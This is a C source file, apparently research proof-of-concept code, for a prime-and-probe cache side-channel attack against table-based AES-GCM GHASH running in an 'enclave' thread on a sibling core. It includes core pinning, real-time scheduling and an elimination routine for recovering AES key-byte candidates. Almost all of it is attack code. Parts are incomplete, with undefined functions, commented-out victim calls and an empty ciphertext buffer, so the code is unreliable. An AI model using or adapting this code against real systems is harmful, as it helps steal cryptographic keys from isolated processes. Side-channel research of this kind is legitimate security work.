#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <time.h>
#include "set_sched.h"
#include "cache.h"

#define BLOCK_SIZE 16
#define ENTRY_SIZE 4
#define KEYLEN 16
#define ROUNDS 1
#define THRESHOLD 0

// Sched. policy
#define SCHED_POLICY SCHED_RR
// Max. realtime priority
#define PRIORITY 0

/*
 * Mainthread and enclave need to be on the same 
 * phy. core but different log. core.
 * cat /proc/cpuinfo | grep 'core id'
 * core id		: 0
 * core id		: 1
 * core id		: 2
 * core id		: 3
 * core id		: 0
 * core id		: 1
 * core id		: 2
 * core id		: 3
 */
#define CPU 0
#define ENCLAVE_CPU 4



static void usage(char**);
static void enclave_thread(void);
static int eliminate(void);
static void calcBaseKey(void);
static void calcKey(void);
static void printKey(void);
static void decryptSecret(void);

/*
 * Global variables exist for alignment reasons.
 * Must not interfer with SBox cachelines.
 */
static int alignment_dummy __attribute__ ((aligned(4096)));
static int alignment_dummy_2 __attribute__ ((aligned(1024)));
static uint32_t evict_count[TABLESIZE/CACHELINESIZE];
static unsigned int n_hits;
static size_t i, j, x, count, cand, byte, l, m, n;
static int p;
static int done_ret;

static pthread_t thread;
static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
static pid_t pid;
static volatile int flag;
static volatile int flag_out;
static volatile int done = 0;
static unsigned char candidates[16][256];
static int candidates_count[16];
static unsigned char cand_index;
static int attack_round = 0;

static uint8_t secret_key[KEYLEN];
static unsigned char in[BLOCK_SIZE];
static unsigned char out[BLOCK_SIZE];
static unsigned char enc_msg[BLOCK_SIZE];
static unsigned char *msg = "Top secret msg!";

///////////////////////////////////////////////

struct timespec i1, i2, i3, i4;

static volatile int thread_done = 0;
static volatile int prime_start = 0;

///////////////////////////////////////////////


#if defined( _WIN32 ) || defined ( _WIN64 )
  #define __STDCALL  __stdcall
  #define __CDECL    __cdecl
  #define __INT64    __int64
  #define __UINT64    unsigned __int64
#else
  #define __STDCALL
  #define __CDECL
  #define __INT64    long long
  #define __UINT64    unsigned long long
#endif

typedef unsigned char  Ipp8u;
typedef unsigned short Ipp16u;
typedef unsigned int   Ipp32u;
typedef signed char    Ipp8s;
typedef signed short   Ipp16s;
typedef signed int     Ipp32s;
typedef float          Ipp32f;
typedef __INT64        Ipp64s;
typedef __UINT64       Ipp64u;
typedef double         Ipp64f;
typedef Ipp16s         Ipp16f;

#if defined(__INTEL_COMPILER) || (_MSC_VER >= 1300)
    #define __ALIGN8  __declspec (align(8))
    #define __ALIGN16 __declspec (align(16))
#if !defined( OSX32 )
    #define __ALIGN32 __declspec (align(32))
#else
    #define __ALIGN32 __declspec (align(16))
#endif
    #define __ALIGN64 __declspec (align(64))
#elif defined (__GNUC__)
    #define __ALIGN8  __attribute((aligned(8)))
    #define __ALIGN16 __attribute((aligned(16)))
    #define __ALIGN32 __attribute((aligned(32)))
    #define __ALIGN64 __attribute((aligned(64)))
#else
    #define __ALIGN8
    #define __ALIGN16
    #define __ALIGN32
    #define __ALIGN64
#endif

/*
// Extract byte from specified position n.
// Sure, n=0,1,2 or 3 only
*/
#define EBYTE(w,n) ((Ipp8u)((w) >> (8 * (n))))


const Ipp16u AesGcmConst_table[256] = {
0x0000, 0xc201, 0x8403, 0x4602, 0x0807, 0xca06, 0x8c04, 0x4e05, 0x100e, 0xd20f, 0x940d, 0x560c, 0x1809, 0xda08, 0x9c0a, 0x5e0b,
0x201c, 0xe21d, 0xa41f, 0x661e, 0x281b, 0xea1a, 0xac18, 0x6e19, 0x3012, 0xf213, 0xb411, 0x7610, 0x3815, 0xfa14, 0xbc16, 0x7e17,
0x4038, 0x8239, 0xc43b, 0x063a, 0x483f, 0x8a3e, 0xcc3c, 0x0e3d, 0x5036, 0x9237, 0xd435, 0x1634, 0x5831, 0x9a30, 0xdc32, 0x1e33,
0x6024, 0xa225, 0xe427, 0x2626, 0x6823, 0xaa22, 0xec20, 0x2e21, 0x702a, 0xb22b, 0xf429, 0x3628, 0x782d, 0xba2c, 0xfc2e, 0x3e2f,
0x8070, 0x4271, 0x0473, 0xc672, 0x8877, 0x4a76, 0x0c74, 0xce75, 0x907e, 0x527f, 0x147d, 0xd67c, 0x9879, 0x5a78, 0x1c7a, 0xde7b,
0xa06c, 0x626d, 0x246f, 0xe66e, 0xa86b, 0x6a6a, 0x2c68, 0xee69, 0xb062, 0x7263, 0x3461, 0xf660, 0xb865, 0x7a64, 0x3c66, 0xfe67,
0xc048, 0x0249, 0x444b, 0x864a, 0xc84f, 0x0a4e, 0x4c4c, 0x8e4d, 0xd046, 0x1247, 0x5445, 0x9644, 0xd841, 0x1a40, 0x5c42, 0x9e43,
0xe054, 0x2255, 0x6457, 0xa656, 0xe853, 0x2a52, 0x6c50, 0xae51, 0xf05a, 0x325b, 0x7459, 0xb658, 0xf85d, 0x3a5c, 0x7c5e, 0xbe5f,
0x00e1, 0xc2e0, 0x84e2, 0x46e3, 0x08e6, 0xcae7, 0x8ce5, 0x4ee4, 0x10ef, 0xd2ee, 0x94ec, 0x56ed, 0x18e8, 0xdae9, 0x9ceb, 0x5eea,
0x20fd, 0xe2fc, 0xa4fe, 0x66ff, 0x28fa, 0xeafb, 0xacf9, 0x6ef8, 0x30f3, 0xf2f2, 0xb4f0, 0x76f1, 0x38f4, 0xfaf5, 0xbcf7, 0x7ef6,
0x40d9, 0x82d8, 0xc4da, 0x06db, 0x48de, 0x8adf, 0xccdd, 0x0edc, 0x50d7, 0x92d6, 0xd4d4, 0x16d5, 0x58d0, 0x9ad1, 0xdcd3, 0x1ed2,
0x60c5, 0xa2c4, 0xe4c6, 0x26c7, 0x68c2, 0xaac3, 0xecc1, 0x2ec0, 0x70cb, 0xb2ca, 0xf4c8, 0x36c9, 0x78cc, 0xbacd, 0xfccf, 0x3ece,
0x8091, 0x4290, 0x0492, 0xc693, 0x8896, 0x4a97, 0x0c95, 0xce94, 0x909f, 0x529e, 0x149c, 0xd69d, 0x9898, 0x5a99, 0x1c9b, 0xde9a,
0xa08d, 0x628c, 0x248e, 0xe68f, 0xa88a, 0x6a8b, 0x2c89, 0xee88, 0xb083, 0x7282, 0x3480, 0xf681, 0xb884, 0x7a85, 0x3c87, 0xfe86,
0xc0a9, 0x02a8, 0x44aa, 0x86ab, 0xc8ae, 0x0aaf, 0x4cad, 0x8eac, 0xd0a7, 0x12a6, 0x54a4, 0x96a5, 0xd8a0, 0x1aa1, 0x5ca3, 0x9ea2,
0xe0b5, 0x22b4, 0x64b6, 0xa6b7, 0xe8b2, 0x2ab3, 0x6cb1, 0xaeb0, 0xf0bb, 0x32ba, 0x74b8, 0xb6b9, 0xf8bc, 0x3abd, 0x7cbf, 0xbebe
};

void XorBlock16(const void* pSrc1, const void* pSrc2, void* pDst)
{
   const Ipp8u* p1 = (const Ipp8u*)pSrc1;
   const Ipp8u* p2 = (const Ipp8u*)pSrc2;
   Ipp8u* d  = (Ipp8u*)pDst;
   int k;
   for(k=0; k<16; k++ )
      d[k] = (Ipp8u)(p1[k] ^p2[k]);
}

void XorBlock(const void* pSrc1, const void* pSrc2, void* pDst, int len)
{
   const Ipp8u* p1 = (const Ipp8u*)pSrc1;
   const Ipp8u* p2 = (const Ipp8u*)pSrc2;
   Ipp8u* d  = (Ipp8u*)pDst;
   int k;
   for(k=0; k<len; k++)
      d[k] = (Ipp8u)(p1[k] ^p2[k]);
}

void CopyBlock16(const void* pSrc, void* pDst)
{
   int k;
   for(k=0; k<16; k++ )
      ((Ipp8u*)pDst)[k] = ((Ipp8u*)pSrc)[k];
}

/*
// AesGcmMulGcm_def|safe(Ipp8u* pGhash, const Ipp8u* pHKey)
//
// Ghash = Ghash * HKey mod G()
*/
void AesGcmMulGcm_table2K(Ipp8u* pGhash, const Ipp8u* pPrecomputeData)
{
   __ALIGN16 Ipp8u t5[BLOCK_SIZE];
   __ALIGN16 Ipp8u t4[BLOCK_SIZE];
   __ALIGN16 Ipp8u t3[BLOCK_SIZE];
   __ALIGN16 Ipp8u t2[BLOCK_SIZE];

   int nw;
   Ipp32u a;

   XorBlock16(t5, t5, t5);
   XorBlock16(t4, t4, t4);
   XorBlock16(t3, t3, t3);
   XorBlock16(t2, t2, t2);

   for(nw=0; nw<4; nw++) {
      Ipp32u hashdw = ((Ipp32u*)pGhash)[nw];

      a = hashdw & 0xf0f0f0f0;
      XorBlock16(t5, pPrecomputeData+1024+EBYTE(a,1)+256*nw, t5);
      XorBlock16(t4, pPrecomputeData+1024+EBYTE(a,0)+256*nw, t4);
      XorBlock16(t3, pPrecomputeData+1024+EBYTE(a,3)+256*nw, t3);
      XorBlock16(t2, pPrecomputeData+1024+EBYTE(a,2)+256*nw, t2);

      a = (hashdw<<4) & 0xf0f0f0f0;
      XorBlock16(t5, pPrecomputeData+EBYTE(a,1)+256*nw, t5);
      XorBlock16(t4, pPrecomputeData+EBYTE(a,0)+256*nw, t4);
      XorBlock16(t3, pPrecomputeData+EBYTE(a,3)+256*nw, t3);
      XorBlock16(t2, pPrecomputeData+EBYTE(a,2)+256*nw, t2);
   }

   XorBlock(t2+1, t3, t2+1, BLOCK_SIZE-1);
   XorBlock(t5+1, t2, t5+1, BLOCK_SIZE-1);
   XorBlock(t4+1, t5, t4+1, BLOCK_SIZE-1);

   nw = t3[BLOCK_SIZE-1];
   a = (Ipp32u)AesGcmConst_table[nw];
   a <<= 8;
   nw = t2[BLOCK_SIZE-1];
   a ^= (Ipp32u)AesGcmConst_table[nw];
   a <<= 8;
   nw = t5[BLOCK_SIZE-1];
   a ^= (Ipp32u)AesGcmConst_table[nw];

   XorBlock(t4, &a, t4, sizeof(Ipp32u));
   CopyBlock16(t4, pGhash);
}

const Ipp8u cipher[960];

Ipp8u pHash[16];

Ipp8u pHKey[2*1024]  __attribute__ ((aligned (4096))) ;

Ipp8u *pSrc;

void init() {

	pSrc = (Ipp8u*)malloc(960);

	memset(pHKey, 0x0, 1024*2);

	memset(pHKey, 0x0, 960);

	memcpy(pSrc, cipher, 960);

	// pHKey[1024+128+13] = 0x71;
	// pHKey[1024+128+14] = 0x74;
	// pHKey[1024+128+15] = 0x85;
}

int mask = 0;

unsigned int auth() {
	unsigned int a = 0;

	Ipp8u tmp = 0;

	int len = 960;
	memset(pHash, 0x0, 16);
	Ipp8u *src = pSrc;

	while(len>=BLOCK_SIZE) {
      	XorBlock16(src, pHash, pHash);
       	AesGcmMulGcm_table2K(pHash, pHKey);

      	src += BLOCK_SIZE;
      	len -= BLOCK_SIZE;
   	}

	return a;
}

///////////////////////////////////////////////






/*
 * Print usage.
 */
void usage(char **argv) {
	printf("Usage: %s arg_bit\n", argv[0]);
}

/*
 * Pthread-function for running the enclave.
 */
static void enclave_thread(void) {

	pthread_mutex_lock(&lock);

	// set cpu for enclave thread
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(ENCLAVE_CPU, &set);
	errno = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &set);
	if(errno != 0) {
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "[Enclave] Enclave running on %d\n", sched_getcpu());
	pthread_mutex_unlock(&lock);

	thread_done = 1;

	while(!prime_start);

	// init();
	// clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &i3);
	// auth();
	// clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &i4);
	// printf("auth times sub: %ld\n", i4.tv_nsec - i3.tv_nsec);
	
}

/*
 * Elimination Method for finding the correct key cleanUp.
 * Source: https://dl.acm.org/citation.cfm?id=1756531
 */
static int eliminate(void) {
	done_ret = 0;
	// take every cache that wasn't evicted
	for(count = 0; count < BLOCK_SIZE; count++) {
		if (evict_count[count] > THRESHOLD) {
			continue;
		}
		done_ret = 1;
		// remove resulting keybytes from candidates list
		for(cand = 0; cand < BLOCK_SIZE; cand++) {
			for(byte = 0; byte < BLOCK_SIZE; byte++) {
				cand_index = out[cand] ^ (Te4_0[((CACHELINESIZE/ENTRY_SIZE)*count)+byte] >> 24);
				if (candidates[cand][cand_index] != 0x00) {
					// eliminate bytes from key candidates, only most significant byte of entry is needed
					candidates[cand][cand_index] = 0x00;
					// reduce number of candidates for keybyte
					candidates_count[cand] -= 1;
				}
				// if every keybyte has one candidate left, we're finished
				if (candidates_count[cand] > 1) {
					done_ret = 0;
				}
			} 
		}
	}	
	return done_ret;
}

#define TIMES 300

void four_bit_test() {

	int repeat = 0;

	uint32_t tmp_code = 0;

	uint32_t count[TIMES][ZU];
	memset(count, 0x0, ZU*4*TIMES);
	for (;repeat < TIMES; repeat++) {
		for (i = 0; i < ZU; i++) {
			// fill cache
			my_prime();

			// auth();
			tmp_code = (uint32_t) * (pHKey + 64*44);
	
			// probe cache
			count[repeat][i] = probe(i);
		}
	}

	for (repeat = 0;repeat < TIMES; repeat++) {
		for(i = 0; i < ZU; i++) {
			if (count[repeat][i] > 0)
				fprintf(stderr, "1");
			else
				fprintf(stderr, "0");			
		}
		fprintf(stderr, "\n");
	}
	
	fprintf(stderr, "\n%d\n", tmp_code);
}

static const uint8_t faddrs[8][64][64] __attribute__ ((aligned (4096)));

int one_bit_test(int LEFT_ONE) {
	int repeat = 0;
	int table;
	int result = 0;

	int ret = 0;

	uint32_t tmp_code = 0;

	uint32_t count[TIMES];
	memset(count, 0x0, 4*TIMES);

	while (!thread_done);

	clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &i1);

	prime_start = 1;

	for (;repeat < TIMES; repeat++) {

		// fill cache
		for (table = 0; table < NUM_TABLES; table++) {
			faddrs[table][LEFT_ONE][0];
		}

		// tmp_code = (uint32_t) * (pHKey + 64*LEFT_ONE);

		serialize();					//prevent out-of-order execution

		// probe cache
		for (table = 0; table < NUM_TABLES; table++) {
			result += measure_pmc(LEFT_ONE, (const uint8_t *) tables[table], TABLESIZE);
		}

		serialize();					//prevent out-of-order execution

		count[repeat] = result;
	}

	clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &i2);

	printf("times sub: %ld\n", i2.tv_nsec - i1.tv_nsec);

	for (repeat = 0;repeat < TIMES; repeat++) {
		if (count[repeat] > 0) {
			fprintf(stderr, "1");
		}
		else {
			fprintf(stderr, "0");			
			ret = 1;
		}
		
		//fprintf(stderr, "\n");
	}
	
	fprintf(stderr, "\n%d\n", tmp_code);

	return ret;
}

/*
 * Start enclave in seperated pthread, perform measurement in main thread.
 */
int main(int argc,char **argv) {
	// align stack, so it doesn't interfer with the measurement
	volatile int alignment_stack __attribute__ ((aligned(4096)));
	volatile int alignment_stack_2 __attribute__ ((aligned(1024)));

	int ret;

	if (argc != 2) {
		usage(argv);
		return EXIT_FAILURE;
	}
	
	long arg_bit = strtol(argv[1], NULL, 10);

	// fill candidates
	for(j=0; j < BLOCK_SIZE; j++) {
		candidates_count[j] = 256;
		for(i=0; i<BLOCK_SIZE*BLOCK_SIZE; i++) {
			candidates[j][i] = 1;
		}
	}	


	//pin to cpu 
	if ((pin_cpu(CPU)) == -1) {
		fprintf(stderr, "[Attacker] Couln't pin to CPU: %d\n", CPU);
		return EXIT_FAILURE;
	}

	// set sched_priority
	if ((set_real_time_sched_priority(SCHED_POLICY, PRIORITY)) == -1) {
		fprintf(stderr, "[Attacker] Couln't set scheduling priority\n");
		return EXIT_FAILURE;
	}

	// Start enclave thread
	fprintf(stderr, "[Attacker] Creating thread\n");
	errno = pthread_create(&thread, NULL, (void* (*) (void*)) enclave_thread, NULL);	
	if (errno != 0) {
		return EXIT_FAILURE;
	}	

	// initalize random generator
	srand(time(NULL));

	pthread_mutex_lock(&lock);
	fprintf(stderr, "[Attacker] Attacker running on %d\n", sched_getcpu());
	pthread_mutex_unlock(&lock);

	// one_bit_test((int)arg_bit);	
	
	for (j = 0; j < 64; j++) {
		ret = one_bit_test(j);

		if (ret) {
			printf("match bit: %d", ret);
		}

		int64_t min = i1.tv_nsec > i3.tv_nsec ? i3.tv_nsec : i1.tv_nsec;
		printf("prime start, prime end, auth start, auth end: \n%ld\n%ld\n%ld\n%ld\n",
			i1.tv_nsec - min, 
			i2.tv_nsec - min, 
			i3.tv_nsec - min,
			i4.tv_nsec - min);
	}

	fprintf(stderr, "[Attacker] Stopping enclave\n");
	// pthread_join(thread, NULL);
	return EXIT_SUCCESS;
}

